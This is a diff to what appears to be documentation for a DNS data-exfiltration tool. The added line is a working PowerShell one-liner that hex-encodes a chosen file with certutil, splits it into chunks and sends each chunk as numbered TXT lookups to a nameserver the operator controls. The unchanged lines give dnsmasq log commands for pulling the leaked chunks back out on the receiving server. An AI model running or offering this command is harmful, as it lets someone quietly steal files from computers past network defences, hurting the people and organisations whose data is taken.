@@ -139,7 +139,9 @@ There may be rare occasions where your output file is blank. Troubleshoot with c
 Check that you're "cutting" correctly from the dnsmasq log using `sudo cat /var/log/dnsmasq.log | grep -F '[TXT]' | cut -f 6 -d ' ' `.  
   
 Adjust "-f 6" to "-f 5" or "-f 7" to change where to cut the log. Once you get the right spot, modify cut command accordingly.
-
+  
+### Command to split file and nslookup with incremental 1., 2., 3., 4.
+certutil -encodehex <file to exfiltrate> encoded.hex 12; $buffer = Get-Content .\encoded.hex; $split = $buffer -split '(.{50})' -ne ''; $n=0; foreach ($line in $split) {$n++; nslookup -q=TXT "$n.$Line.<yourdomain.com>" ns1.<yourdomain.com>; sleep 5}
 
 ### Regex to search for 1.xxxxx.dnsname.com, 10.xxxxx.dnsname.com, 100.xxxxx.dnsname.com
 sudo cat /var/log/dnsmasq.log | grep -F "query[A]" | cut -f 6 -d ' ' | grep -P "^\d{1,3}\."  
